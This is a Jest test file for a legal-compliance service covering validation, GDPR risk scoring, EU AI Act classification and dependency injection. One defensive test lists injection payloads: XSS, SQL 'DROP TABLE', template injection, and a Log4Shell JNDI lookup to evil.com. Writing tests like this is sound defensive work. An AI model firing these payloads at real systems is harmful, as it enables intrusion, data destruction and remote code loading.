/**
 * Essential Tests - Core Business Logic Only
 * Testing critical functionality that directly impacts user safety and business logic
 */

import { DIContainer, TOKENS } from '../shared/container.js';
import {
  LegalRequestSchema,
  CaseLawSearchSchema,
  GDPRComplianceSchema,
  AIActClassificationSchema,
  validate
} from '../shared/validators.js';
import { GDPRComplianceServiceImpl } from '../infrastructure/services.js';

describe('Essential Business Logic', () => {
  describe('Critical Input Validation', () => {
    it('should prevent injection attacks in search queries', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '"; DROP TABLE users; --',
        '{{constructor.constructor("return process")().exit()}}',
        '${jndi:ldap://evil.com/a}'
      ];

      maliciousInputs.forEach(input => {
        expect(() => validate(CaseLawSearchSchema)({ query: input }))
          .not.toThrow(); // Should sanitize, not crash
      });
    });

    it('should validate required GDPR fields', () => {
      expect(() => validate(GDPRComplianceSchema)({}))
        .toThrow('Required');
      
      expect(() => validate(GDPRComplianceSchema)({
        dataTypes: [],
        processingPurpose: 'marketing'
      })).toThrow('At least one data type is required');
    });

    it('should enforce AI system description minimum length', () => {
      expect(() => validate(AIActClassificationSchema)({
        systemDescription: 'AI',
        applicationDomain: 'healthcare'
      })).toThrow('System description too short');
    });
  });

  describe('GDPR Risk Calculation', () => {
    let service: GDPRComplianceServiceImpl;

    beforeEach(() => {
      service = new GDPRComplianceServiceImpl();
    });

    it('should correctly assess high-risk sensitive data', async () => {
      const highRiskRequest = {
        id: 'test-1',
        type: 'gdpr' as const,
        query: 'Process biometric data for employee monitoring',
        parameters: {
          dataTypes: ['biometric', 'health', 'genetic'],
          processingPurpose: 'employee monitoring',
          thirdPartySharing: true
        },
        timestamp: new Date()
      };

      const result = await service.assessGDPR(highRiskRequest);
      
      expect(result.riskLevel).toBe('critical');
      expect(result.score).toBeLessThan(50);
      expect(result.violations.length).toBeGreaterThan(0);
    });

    it('should assess low-risk minimal data correctly', async () => {
      const lowRiskRequest = {
        id: 'test-2',
        type: 'gdpr' as const,
        query: 'Process email for newsletter',
        parameters: {
          dataTypes: ['email'],
          processingPurpose: 'newsletter subscription',
          legalBasis: 'consent',
          dataRetention: '12 months',
          thirdPartySharing: false
        },
        timestamp: new Date()
      };

      const result = await service.assessGDPR(lowRiskRequest);
      
      expect(result.riskLevel).toBe('low');
      expect(result.score).toBeGreaterThan(70);
      expect(result.violations.length).toBe(0);
    });
  });

  describe('AI Act Classification Logic', () => {
    let service: GDPRComplianceServiceImpl;

    beforeEach(() => {
      service = new GDPRComplianceServiceImpl();
    });

    it('should classify prohibited AI systems correctly', async () => {
      const prohibitedRequest = {
        id: 'test-3',
        type: 'ai-act' as const,
        query: 'Social scoring system for citizen ranking',
        parameters: {
          systemDescription: 'AI system that scores citizens based on social behavior and assigns rankings for government services access',
          applicationDomain: 'government services'
        },
        timestamp: new Date()
      };

      const result = await service.assessAIAct(prohibitedRequest);
      
      expect(result.metadata.riskCategory).toBe('unacceptable');
      expect(result.riskLevel).toBe('critical');
      expect(result.recommendations[0]).toContain('prohibited');
    });

    it('should classify high-risk employment AI correctly', async () => {
      const highRiskRequest = {
        id: 'test-4',
        type: 'ai-act' as const,
        query: 'AI system for automated hiring decisions',
        parameters: {
          systemDescription: 'Machine learning system that automatically screens job applications and makes hiring recommendations based on CV analysis',
          applicationDomain: 'recruitment'
        },
        timestamp: new Date()
      };

      const result = await service.assessAIAct(highRiskRequest);
      
      expect(result.metadata.riskCategory).toBe('high');
      expect(result.recommendations).toContain('Conduct conformity assessment');
    });
  });

  describe('Dependency Injection Core', () => {
    let container: DIContainer;

    beforeEach(() => {
      container = DIContainer.getInstance();
      container.clear();
    });

    afterEach(() => {
      container.clear();
    });

    it('should maintain singleton pattern', () => {
      const instance1 = DIContainer.getInstance();
      const instance2 = DIContainer.getInstance();
      expect(instance1).toBe(instance2);
    });

    it('should register and resolve services correctly', () => {
      class TestService {
        getValue() { return 'test'; }
      }

      container.register(TOKENS.CASE_LAW_SERVICE, TestService);
      const resolved = container.resolve<TestService>(TOKENS.CASE_LAW_SERVICE);
      
      expect(resolved.getValue()).toBe('test');
    });

    it('should throw for unregistered services', () => {
      expect(() => container.resolve(Symbol('unknown')))
        .toThrow('Service not found');
    });
  });

  describe('Security Boundaries', () => {
    it('should handle extremely large inputs gracefully', () => {
      const largeInput = 'x'.repeat(1000000); // 1MB string
      
      expect(() => validate(LegalRequestSchema)({ query: largeInput }))
        .not.toThrow();
    });

    it('should handle special unicode characters', () => {
      const unicodeInput = '👨‍⚖️🇳🇱 legal test 中文 العربية עברית';
      
      const result = validate(CaseLawSearchSchema)({ query: unicodeInput });
      expect(result.query).toBe(unicodeInput);
    });

    it('should sanitize null bytes and control characters', () => {
      const maliciousInput = 'test\0\x01\x02\x03query';
      
      expect(() => validate(LegalRequestSchema)({ query: maliciousInput }))
        .not.toThrow();
    });
  });
});